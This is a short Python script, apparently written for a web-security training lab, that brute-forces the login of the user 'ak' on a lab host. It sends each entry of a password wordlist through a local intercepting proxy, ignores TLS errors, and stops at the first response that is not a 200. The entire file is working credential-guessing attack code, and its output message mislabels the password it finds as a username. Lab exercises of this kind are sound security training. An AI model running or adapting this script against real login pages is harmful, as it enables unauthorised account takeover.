import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def brute(s, url):
    uri = url + '/login'
    with open('Authentication/password.txt') as f:
        lines = f.readlines()
        for pwd in lines:
            password = pwd.strip()
            data = {'username': 'ak', 'password': password}
            r = s.post(uri,data=data,allow_redirects=False,verify=False,proxies=proxies)
            if r.status_code != 200:
                sys.stdout.write('\r' + password + ' is valid username')
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r'+'Exploit is running.....!')
                sys.stdout.flush()

        print('\n'+'Done!')
def main():
    s = requests.Session()
    url = 'https://0a9600dc03a9043180fc2142002000c6.web-security-academy.net'
    brute(s,url)

if __name__=='__main__':
    main()